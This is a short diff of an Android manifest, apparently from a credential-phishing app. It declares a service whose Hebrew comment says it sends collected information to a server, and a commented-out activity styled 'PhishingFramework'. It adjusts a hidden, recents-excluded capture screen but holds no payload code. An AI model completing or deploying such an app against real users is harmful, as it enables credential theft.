@@ -51,12 +51,18 @@
             android:exported="false"
             android:excludeFromRecents="true"
             android:taskAffinity=""
-            android:launchMode="singleInstance" />
+            android:launchMode="singleTop"
+            android:windowSoftInputMode="adjustResize|stateVisible"/>
 
         <!-- השירות ששולח את המידע לשרת -->
         <service
             android:name=".CredentialSendService"
             android:exported="false" />
+
+<!--        <activity-->
+<!--            android:name=".CaughtActivity"-->
+<!--            android:exported="true"-->
+<!--            android:theme="@style/Theme.PhishingFramework" />-->
 
     </application>
 
